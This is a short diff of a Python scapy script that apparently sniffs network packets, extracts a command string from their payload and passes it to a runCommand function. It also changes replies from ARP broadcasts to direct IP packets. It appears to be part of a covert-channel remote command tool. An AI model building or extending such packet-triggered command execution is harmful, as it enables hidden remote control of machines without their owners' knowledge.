@@ -14,14 +14,14 @@ def processSniffedPacket(packet):
         command = response[1:-1]                                                #uhhhh you can figure it out
         print(command)
         if command != "":
-            mac = packet.src
-            print(mac)
-            runCommand(command, mac)
+            ip = packet[IP].src
+            print(ip)
+            runCommand(command, ip)
     except:
         pass
 
-def reply(string, mac):
-    packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP() / scapy.Raw(load=string)
+def reply(string, ip):
+    packet = scapy.IP(dst=ip) / scapy.Raw(load=string)
     print(packet.show())
     scapy.send(packet)
 
